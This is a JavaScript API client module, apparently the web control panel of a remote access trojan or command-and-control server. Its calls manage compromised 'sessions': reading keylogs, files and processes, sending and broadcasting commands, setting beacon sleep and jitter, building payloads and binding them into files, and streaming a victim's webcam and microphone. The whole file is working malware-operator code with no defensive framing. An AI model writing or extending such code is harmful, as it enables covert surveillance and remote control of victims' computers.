/* HTTP access. A ?token= link is forwarded to every same-origin call. */

export const TOKEN = new URLSearchParams(location.search).get('token') || '';

export const withToken = (url) => (TOKEN
  ? url + (url.includes('?') ? '&' : '?') + 'token=' + encodeURIComponent(TOKEN)
  : url);

const rawFetch = window.fetch.bind(window);
window.fetch = (input, init) => rawFetch(
  typeof input === 'string' && input.startsWith('/') ? withToken(input) : input, init);

async function json(res) {
  if (res.status === 401) {
    const next = encodeURIComponent(location.hash.replace(/^#/, '/') || '/');
    if (!location.pathname.startsWith('/login')) location.replace(`/login?next=${next}`);
    throw new Error('signed out');
  }
  if (!res.ok) {
    let detail = res.statusText;
    try { detail = (await res.json()).detail || detail; } catch { /* not json */ }
    throw new Error(detail);
  }
  return res.status === 204 ? null : res.json();
}

const send = (method, url, body) => rawFetch(withToken(url), {
  method,
  headers: body ? { 'Content-Type': 'application/json' } : undefined,
  body: body ? JSON.stringify(body) : undefined,
}).then(json);

export const api = {
  me: () => rawFetch(withToken('/api/me')).then(json),
  login: (user, pass, remember = true) => send('POST', '/api/login', { user, pass, remember }),
  logout: () => send('POST', '/api/logout'),

  config: () => rawFetch(withToken('/api/config')).then(json),
  tools: () => rawFetch(withToken('/api/tools')).then(json),
  stats: () => rawFetch(withToken('/api/stats')).then(json),
  events: (limit = 300) => rawFetch(withToken(`/api/events?limit=${limit}`)).then(json),

  sessions: () => rawFetch(withToken('/api/sessions')).then(json),
  session: (sid) => rawFetch(withToken(`/api/session/${sid}`)).then(json),
  timeline: (sid, tool = '') => rawFetch(withToken(
    `/api/session/${sid}/timeline?limit=250${tool ? `&tool=${tool}` : ''}`)).then(json),

  runTool: (sid, tool, body) => send('POST', `/api/session/${sid}/tool/${tool}`, body || {}),
  keylog: (sid) => rawFetch(withToken(`/api/session/${sid}/keylog`)).then(json),
  keylogAction: (sid, action, body) => send('POST', `/api/session/${sid}/keylog/${action}`, body || {}),
  files: (sid) => rawFetch(withToken(`/api/session/${sid}/files`)).then(json),
  processes: (sid) => rawFetch(withToken(`/api/session/${sid}/processes`)).then(json),
  scan: (sid) => rawFetch(withToken(`/api/session/${sid}/scan`)).then(json),

  command: (sid, type, args) => send('POST', `/api/session/${sid}/command`, { type, args: args || {} }),
  broadcast: (ids, type, args) => send('POST', '/api/broadcast', { session_ids: ids, type, args: args || {} }),
  sleep: (sid, sleep, jitter) => send('POST', `/api/session/${sid}/sleep`, { sleep, jitter }),
  patchSession: (sid, body) => send('PATCH', `/api/session/${sid}`, body),
  dropSession: (sid) => send('DELETE', `/api/session/${sid}`),

  builds: () => rawFetch(withToken('/api/builds')).then(json),
  deleteBuild: (name) => send('DELETE', '/api/builds/' + encodeURIComponent(name)),
  build: (body) => send('POST', '/api/build', body),
  bind: (form) => rawFetch(withToken('/api/bind'), { method: 'POST', body: form }).then(json),
};

export const url = {
  build: (name) => withToken('/api/builds/' + encodeURIComponent(name)),
  blob: (path) => withToken(path),
  camMjpg: (sid) => withToken(`/api/session/${sid}/cam.mjpg?t=${Date.now()}`),
  camJpg: (sid) => withToken(`/api/session/${sid}/cam.jpg?t=${Date.now()}`),
  micPcm: (sid) => withToken(`/api/session/${sid}/mic.pcm`),
};
